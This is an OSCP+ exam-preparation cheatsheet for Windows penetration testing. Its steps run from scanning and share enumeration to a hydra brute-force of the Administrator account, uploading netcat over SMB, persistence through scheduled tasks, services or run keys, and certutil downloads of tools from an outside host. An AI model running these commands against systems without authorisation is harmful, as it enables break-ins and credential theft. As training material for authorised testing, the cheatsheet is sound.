# 🪟 OSCP+ Windows Standalone Cheatsheet

## 1. 🔍 Initial Enumeration (Before Exploit)

### 🔎 Nmap
```bash
nmap -sC -sV -Pn -p- <IP> -oN win_full.nmap
```

### 🔑 Common Ports
| Port | Service | Notes |
|------|---------|-------|
| 135  | RPC     | Use `rpcclient` |
| 139, 445 | SMB | Null sessions, shares |
| 3389 | RDP     | Brute-force weak creds |
| 5985 | WinRM   | PowerShell remoting |
| 496xx | High RPC ports | Seen in newer Windows |

### 🗂 SMB
```bash
smbclient -L \\\\<IP>\\ -N
smbclient \\\\<IP>\\share -N
enum4linux-ng -A <IP>
```

### 🧑‍💻 RPC
```bash
rpcclient -U "" <IP>
> enumdomusers
> queryuser RID
```

### 💻 WinRM
```bash
crackmapexec winrm <IP> -u user -p pass
```

---

## 2. 🧨 Initial Access / Exploitation

### 🔓 Exploits
- EternalBlue (MS17-010)
- RDP BlueKeep
- Web upload > RCE
- Weak passwords (SMB, WinRM)

```bash
hydra -l Administrator -P rockyou.txt smb://<IP>
```

### 📂 Upload via SMB
```bash
smbclient \\\\<IP>\\share
put nc.exe
```

Run using:
- `schtasks`
- `sc.exe`
- Registry run keys

---

## 3. 📈 Local Post-Exploitation

### 🧰 Tools
- `winPEASx64.exe`
- `whoami`, `net users`, `systeminfo`, etc.

### 🐚 Useful Commands
```powershell
whoami /priv
net user
net localgroup administrators
systeminfo
```

### 🔥 Upload Tools
```powershell
certutil -urlcache -f http://<IP>/winpeas.exe winpeas.exe
Invoke-WebRequest http://<IP>/nc.exe -OutFile nc.exe
```

---
